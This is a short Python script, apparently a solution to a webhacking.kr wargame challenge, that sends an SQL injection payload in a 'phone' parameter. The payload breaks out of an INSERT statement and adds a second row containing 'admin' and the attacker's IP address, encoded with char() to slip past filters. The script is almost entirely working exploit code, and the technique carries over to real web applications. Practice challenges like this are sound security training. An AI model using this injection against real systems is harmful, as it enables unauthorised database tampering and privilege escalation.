import requests
import binascii

url = 'http://webhacking.kr/challenge/web/web-17/index.php'
cookies = {
	'PHPSESSID': ''
}
payloads = {
	'phone': ''
}

res = requests.get('http://ifconfig.me')
ip = res.text.rstrip().lstrip()

s1 = ''.join("%d," % ord(c) for c in "admin")
s1 = 'char(' + s1[:-1] + ')'
s2 = ''.join("%d," % ord(c) for c in ip)
s2 = 'char(' + s2[:-1] + ')'

payloads['phone'] = "1),(%s,%s,2" % (s1, s2)
print(payloads['phone'])

res = requests.get(url, cookies=cookies, params=payloads)
print(res.text)

res = requests.get(url, cookies=cookies)
print(res.text)